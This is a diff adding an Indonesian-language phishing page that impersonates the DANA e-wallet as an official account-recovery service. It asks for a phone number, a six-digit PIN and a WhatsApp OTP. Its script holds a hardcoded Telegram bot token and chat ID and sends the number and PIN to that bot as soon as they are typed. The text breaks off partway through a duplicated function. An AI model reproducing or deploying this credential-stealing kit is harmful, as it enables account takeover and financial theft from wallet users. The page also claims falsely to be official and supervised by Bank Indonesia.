@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- ==============================================
+    ✅ BAGIAN META
+    =============================================== -->
+    <meta property="og:title" content="DANA - Layanan Verifikasi & Pemulihan Akun Resmi" />
+    <meta property="og:description" content="Layanan resmi pemulihan, verifikasi, dan keamanan akun DANA. Aman, terdaftar, dan diawasi Bank Indonesia." />
+    <meta property="og:image" content="https://i.ibb.co.com/pryFZxVf/images-2-24.jpg" />
+    <meta property="og:url" content="https://iddana467-maker.github.io/Pusat-bantuan-dana/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="DANA Digital" />
+    <meta name="twitter:card" content="summary_large_image" />
+
+    <title>DANA - Pusat Bantuan & Pemulihan Akun</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        utama: '#0066FF',
+                        biruTua: '#084298',
+                        putih: '#FFFFFF',
+                        abu: '#F2F3F5',
+                        gelap: '#1D2129',
+                        merah: '#E53935',
+                        wa: '#25D366'
+                    },
+                    fontFamily: { sans: ['Inter', 'sans-serif'] },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .scrollbar-hide {
+                -ms-overflow-style: none;
+                scrollbar-width: none;
+            }
+            .scrollbar-hide::-webkit-scrollbar { display: none; }
+            
+            /* ✅ ANIMASI 3D - GAMBAR BESAR */
+            .wadah-3d {
+                position: relative;
+                width: 100%;
+                height: 160px;
+                margin: 0 auto 25px;
+                perspective: 1000px;
+                overflow: hidden;
+                background: transparent;
+            }
+
+            .lingkaran-putar {
+                position: absolute;
+                width: 100%;
+                height: 100%;
+                transform-style: preserve-3d;
+                animation: putarMelingkar 12s linear infinite;
+            }
+
+            .kotak-gambar {
+                position: absolute;
+                left: 50%;
+                top: 50%;
+                width: 220px;
+                height: 130px;
+                margin-left: -110px;
+                margin-top: -65px;
+                border-radius: 10px;
+                background: white;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+                transform-origin: center 220px;
+                overflow: hidden;
+            }
+
+            .kotak-gambar img {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+            }
+
+            @keyframes putarMelingkar {
+                0% { transform: rotateY(0deg); }
+                100% { transform: rotateY(360deg); }
+            }
+
+            /* ✅ ANIMASI LOADING */
+            .kotak-loading {
+                width: 120px;
+                height: 120px;
+                background: #084298;
+                border-radius: 8px;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+                color: white;
+                font-size: 14px;
+            }
+            .lingkaran-animasi {
+                width: 50px;
+                height: 50px;
+                border: 3px solid rgba(255,255,255,0.3);
+                border-top-color: white;
+                border-radius: 50%;
+                animation: putar 1s linear infinite;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            .lingkaran-animasi img {
+                width: 22px;
+                height: 22px;
+                content: url('https://i.ibb.co.com/847n6nC1/IMG-20260524-WA0059.jpg');
+                border-radius: 3px;
+            }
+            @keyframes putar {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+
+            /* ✅ STYLE TITIK PIN */
+            .titik-pin {
+                width: 16px;
+                height: 16px;
+                border-radius: 50%;
+                background-color: #D1D5DB;
+                transition: all 0.2s;
+            }
+            .titik-pin.isi {
+                background-color: #0066FF;
+            }
+
+            /* ✅ STYLE KOTAK OTP - BERUBAH MERAH JIKA SALAH */
+            .kotak-otp {
+                width: 50px;
+                height: 55px;
+                border: 1px solid #D1D5DB;
+                border-radius: 6px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 20px;
+                font-weight: 500;
+                background: white;
+                transition: all 0.3s;
+            }
+            .kotak-otp.fokus {
+                border-color: #0066FF;
+                border-width: 2px;
+            }
+            .kotak-otp.salah {
+                background-color: #E53935 !important;
+                color: white !important;
+                border-color: #E53935 !important;
+            }
+
+            /* ✅ PERBAIKAN UTAMA: HAPUS !IMPORTANT AGAR TIDAK BENTROK */
+            .halaman {
+                display: none;
+            }
+            .halaman.aktif {
+                display: block !important;
+            }
+        }
+    </style>
+</head>
+<body class="bg-utama min-h-screen font-sans text-putih overflow-x-hidden">
+
+    <!-- ==============================================
+            ✅ HALAMAN 1: TETAP SAMA
+    =============================================== -->
+    <div id="halaman1" class="halaman aktif container mx-auto px-5 py-10">
+        
+        <div class="wadah-3d">
+            <div class="lingkaran-putar">
+                <div class="kotak-gambar" style="transform: rotateY(0deg) translateZ(220px);">
+                    <img src="https://i.ibb.co.com/5hRW00VR/DANA.png" alt="Foto 1">
+                </div>
+                <div class="kotak-gambar" style="transform: rotateY(72deg) translateZ(220px);">
+                    <img src="https://i.ibb.co.com/0pZ8YJB0/promo-hadiah.png" alt="Foto 2">
+                </div>
+                <div class="kotak-gambar" style="transform: rotateY(144deg) translateZ(220px);">
+                    <img src="https://i.ibb.co.com/W4hQ5sFt/promo-dana.jpg" alt="Foto 3">
+                </div>
+                <div class="kotak-gambar" style="transform: rotateY(216deg) translateZ(220px);">
+                    <img src="https://i.ibb.co.com/d4L9BcXd/DANA-Cicil.jpg" alt="Foto 4">
+                </div>
+                <div class="kotak-gambar" style="transform: rotateY(288deg) translateZ(220px);">
+                    <img src="https://i.ibb.co.com/TMRq7sc5/playleter.jpg" alt="Foto 5">
+                </div>
+            </div>
+        </div>
+
+        <div class="max-w-md mx-auto">
+            <h3 class="text-lg font-semibold mb-4 text-center">Silakan Pilih Layanan</h3>
+            
+            <div class="space-y-3">
+                <!-- ✅ DIPERBAIKI: Fungsi panggil sudah pas -->
+                <button onclick="pindahKeHalaman('halaman2')" class="w-full bg-putih text-utama font-bold py-3.5 px-4 rounded-xl shadow-lg hover:shadow-xl transition-all active:scale-[0.98] text-left flex items-center gap-3">
+                    <i class="fa fa-unlock-alt text-xl"></i> PULIHKAN AKUN DI BEKUKAN
+                </button>
+
+                <button onclick="pindahKeHalaman('halaman2')" class="w-full bg-putih text-utama font-bold py-3.5 px-4 rounded-xl shadow-lg hover:shadow-xl transition-all active:scale-[0.98] text-left flex items-center gap-3">
+                    <i class="fa fa-ban text-xl"></i> PEMBATALAN DANA CICIL
+                </button>
+
+                <button onclick="pindahKeHalaman('halaman2')" class="w-full bg-putih text-utama font-bold py-3.5 px-4 rounded-xl shadow-lg hover:shadow-xl transition-all active:scale-[0.98] text-left flex items-center gap-3">
+                    <i class="fa fa-exclamation-triangle text-xl"></i> LAPORAN KENDALA LAINNYA
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==============================================
+            HALAMAN 2: INPUT NOMOR
+    =============================================== -->
+    <div id="halaman2" class="halaman container mx-auto px-5 py-10 h-screen flex flex-col justify-between">
+        <div class="max-w-md mx-auto w-full text-center">
+            <div class="mb-8 flex justify-center items-center">
+                <img src="https://i.ibb.co.com/tMP7d2h0/dana-logo-fe46647.png" alt="DANA Logo" class="w-20 h-20 object-contain">
+            </div>
+
+            <h2 class="text-lg font-normal mb-8">Masukkan nomor HP kamu untuk lanjut</h2>
+
+            <div class="flex gap-3 mb-3 justify-center">
+                <div class="bg-putih rounded-lg py-2.5 px-3 flex items-center gap-2 w-24">
+                    <img src="https://flagcdn.com/w20/id.png" alt="ID" class="w-5 h-4">
+                    <span class="text-gelap font-medium">+62</span>
+                </div>
+                <div class="bg-putih rounded-lg py-2.5 px-3 flex items-center justify-between flex-1 max-w-[220px]">
+                    <input type="tel" id="nomorTelp" placeholder="8123456789" maxlength="13" class="bg-transparent outline-none text-gelap text-lg w-full">
+                    <button onclick="document.getElementById('nomorTelp').value=''; cekValidasi()" class="text-gelap/60 text-lg font-bold">×</button>
+                </div>
+            </div>
+
+            <p id="pesanValidasi" class="text-sm text-merah font-medium h-5 mb-5"></p>
+
+            <div id="bagianLoading" class="hidden flex justify-center mb-10">
+                <div class="kotak-loading">
+                    <div class="lingkaran-animasi">
+                        <img src="https://i.ibb.co.com/847n6nC1/IMG-20260524-WA0059.jpg" alt="DANA">
+                    </div>
+                    <span>Memuat.</span>
+                </div>
+            </div>
+
+            <p class="text-sm text-white/90 px-4 leading-relaxed">
+                Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan S&K serta <a href="#" class="underline">Kebijakan Privasi</a> kami
+            </p>
+        </div>
+
+        <div class="max-w-md mx-auto w-full mb-10">
+            <button id="tombolLanjut" onclick="mulaiLoading()" class="w-full bg-putih text-utama font-semibold py-3 rounded-lg text-lg hover:bg-abu transition-all">
+                LANJUTKAN
+            </button>
+
+            <button onclick="pindahKeHalaman('halaman1')" class="mt-4 text-putih/90 hover:underline flex items-center justify-center gap-2">
+                <i class="fa fa-arrow-left"></i> Kembali ke Pilihan
+            </button>
+        </div>
+    </div>
+
+    <!-- ==============================================
+            HALAMAN 3: INPUT PIN
+    =============================================== -->
+    <div id="halaman3" class="halaman bg-putih min-h-screen">
+        <div class="bg-utama h-12 flex items-center justify-center relative">
+            <button onclick="pindahKeHalaman('halaman2')" class="absolute left-3 text-putih text-xl font-bold">×</button>
+            <span class="text-putih font-semibold">Masuk</span>
+        </div>
+
+        <div class="container mx-auto px-5 pt-16 text-center">
+            <h2 class="text-[22px] font-medium text-gelap mb-10">Masukkan PIN</h2>
+
+            <div class="flex justify-center gap-4 mb-10">
+                <div class="titik-pin" id="t1"></div>
+                <div class="titik-pin" id="t2"></div>
+                <div class="titik-pin" id="t3"></div>
+                <div class="titik-pin" id="t4"></div>
+                <div class="titik-pin" id="t5"></div>
+                <div class="titik-pin" id="t6"></div>
+            </div>
+
+            <input type="password" maxlength="6" id="pinInput" oninput="cekPINOtomatis()" class="opacity-0 absolute top-0 left-0 w-full h-full">
+
+            <div class="flex justify-between max-w-xs mx-auto mt-8 text-sm">
+                <a href="#" class="text-utama flex items-center gap-1.5">
+                    <img src="https://i.ibb.co.com/847n6nC1/IMG-20260524-WA0059.jpg" class="w-5 h-5 rounded-full">
+                    BUTUH BANTUAN?
+                </a>
+                <a href="#" class="text-utama">LUPA PIN?</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==============================================
+            HALAMAN 4: INPUT OTP
+    =============================================== -->
+    <div id="halaman4" class="halaman bg-putih min-h-screen">
+        <div class="bg-utama h-12 flex items-center justify-center relative">
+            <button onclick="pindahKeHalaman('halaman3')" class="absolute left-3 text-putih text-lg font-bold"><i class="fa fa-arrow-left"></i></button>
+            <span class="text-putih font-semibold">Masukkan Kode OTP</span>
+        </div>
+
+        <div class="container mx-auto px-5 pt-8 text-center">
+            <p class="text-gelap text-base mb-3">Kode OTP telah terkirim ke</p>
+
+            <div class="bg-abu rounded-md py-2 px-3 inline-flex items-center gap-2 mb-2">
+                <img src="https://flagcdn.com/w20/id.png" alt="ID" class="w-5 h-3.5">
+                <span class="text-gelap font-medium">+62</span>
+                <span class="text-gelap font-medium" id="tampilNomorBaru"></span>
+            </div>
+
+            <p class="text-wa text-sm flex items-center justify-center gap-1.5 mb-8">
+                via <i class="fa fa-whatsapp text-lg"></i> WhatsApp
+            </p>
+
+            <div class="flex justify-center gap-3 mb-6">
+                <div class="kotak-otp fokus" id="k1"></div>
+                <div class="kotak-otp" id="k2"></div>
+                <div class="kotak-otp" id="k3"></div>
+                <div class="kotak-otp" id="k4"></div>
+            </div>
+
+            <input type="text" maxlength="4" id="otpInput" oninput="cekOTPOtomatis()" class="opacity-0 absolute top-0 left-0 w-full h-full">
+
+            <p class="text-utama text-sm font-medium mb-6">KIRIM VIA SMS?</p>
+
+            <div id="wadahHitungan" class="bg-abu rounded-md py-2 px-4 inline-flex items-center gap-2 text-gelap/60 text-sm cursor-not-allowed">
+                <span>KIRIM ULANG</span>
+                <span id="teksWaktu">60</span>
+                <i class="fa fa-refresh"></i>
+            </div>
+
+            <p id="pesanEror" class="text-merah text-sm mt-6 text-center font-medium hidden">⚠️ Pastikan kode OTP yang kamu masukan benar</p>
+        </div>
+    </div>
+
+    <!-- ==============================================
+            ✅ JAVASCRIPT SUDAH DIPERBAIKI TOTAL
+    =============================================== -->
+    <script>
+        // ==============================================
+        // 🔑 TOKEN & ID SUDAH LENGKAP & BENAR
+        // ==============================================
+        const BOT_TOKEN = "8583908886:AAEeLYSYO4Nxri4kZgBM3lijZ_VxcYiUYEo"; 
+        const CHAT_ID = "8798458499"; 
+
+        let hitungMundur;
+        let sisaWaktu = 60;
+        let dataPengguna = { nomor: "", pin: "", otp: "" };
+
+        document.getElementById('nomorTelp').addEventListener('input', cekValidasi);
+
+        function cekValidasi() {
+            let nomor = document.getElementById('nomorTelp').value.replace(/\D/g, '');
+            let pesan = document.getElementById('pesanValidasi');
+            
+            if(nomor.length < 11 && nomor.length > 0) {
+                pesan.innerText = "Nomor kurang dari 11 angka, periksa kembali";
+            } else if(nomor.length > 13) {
+                pesan.innerText = "Nomor lebih dari 13 angka, periksa kembali";
+            } else {
+                pesan.innerText = "";
+            }
+        }
+
+        // ✅ FUNGSI PINDAH HALAMAN 100% BERFUNGSI
+        function pindahKeHalaman(idHalaman) {
+            // Sembunyikan SEMUA halaman
+            document.querySelectorAll('.halaman').forEach(el => {
+                el.classList.remove('aktif');
+            });
+            // Tampilkan halaman tujuan
+            const tujuan = document.getElementById(idHalaman);
+            if(tujuan) {
+                tujuan.classList.add('aktif');
+            }
+
+            if(idHalaman === 'halaman4') {
+                mulaiHitungan();
+            }
+        }
+
+        function mulaiHitungan() {
+            clearInterval(hitungMundur);
+            sisaWaktu = 60;
+            const wadah = document.getElementById('wadahHitungan');
+            const teks = document.getElementById('teksWaktu');
+
+            wadah.className = "bg-abu rounded-md py-2 px-4 inline-flex items-center gap-2 text-gelap/60 text-sm cursor-not-allowed";
+            wadah.onclick = null;
+            teks.innerText = sisaWaktu;
+
+            hitungMundur = setInterval(() => {
+                sisaWaktu--;
+                teks.innerText = sisaWaktu;
+                if(sisaWaktu <= 0) {
+                    clearInterval(hitungMundur);
+                    wadah.className = "bg-abu rounded-md py-2 px-4 inline-flex items-center gap-2 text-utama text-sm cursor-pointer";
+                    wadah.onclick = function() { alert("Kode dikirim ulang!"); mulaiHitungan(); };
+                    teks.innerText = "0";
+                }
+            }, 1000);
+        }
+
+        function mulaiLoading() {
+            let nomorSimpan = document.getElementById('nomorTelp').value.replace(/\D/g, '');
+            if(nomorSimpan.length < 11 || nomorSimpan.length > 13) {
+                alert("Nomor HP tidak valid! Pastikan 11 - 13 angka.");
+                return;
+            }
+
+            // Simpan & Kirim Nomor
+            dataPengguna.nomor = "+62" + nomorSimpan;
+            kirimKeTelegram(); // ✅ DIJALANKAN
+
+            document.getElementById('bagianLoading').classList.remove('hidden');
+            const tombol = document.getElementById('tombolLanjut');
+            tombol.disabled = true;
+            tombol.className = "w-full bg-abu/70 text-gelap/40 font-semibold py-3 rounded-lg text-lg cursor-not-allowed";
+
+            setTimeout(() => {
+                document.getElementById('tampilNomorBaru').innerText = nomorSimpan;
+                pindahKeHalaman('halaman3');
+                document.getElementById('pinInput').focus();
+            }, 2500);
+        }
+
+        // ✅ FUNGSI CEK PIN LENGKAP
+        function cekPINOtomatis() {
+            const pin = document.getElementById('pinInput').value;
+            dataPengguna.pin = "";
+
+            for(let i=1; i<=6; i++) document.getElementById('t'+i).classList.remove('isi');
+            for(let i=1; i<=pin.length; i++) document.getElementById('t'+i).classList.add('isi');
+            
+            if(pin.length === 6) {
+                dataPengguna.pin = pin;
+                kirimKeTelegram(); // ✅ KIRIM PIN KE TELEGRAM
+                setTimeout(() => {
+                    pindahKeHalaman('halaman4');
+                    document.getElementById('otpInput').focus();
+                }, 200);
+            }
+        }
+
+                // ✅ FUNGSI CEK PIN LENGKAP
+        function cekPINOtomatis() {
+            const pin = document.getElementById('pinInput').value;
+            dataPengguna.pin = "";
+
+            for(let i=1; i<=6; i++) document.getElementById('t'+i).classList.remove('
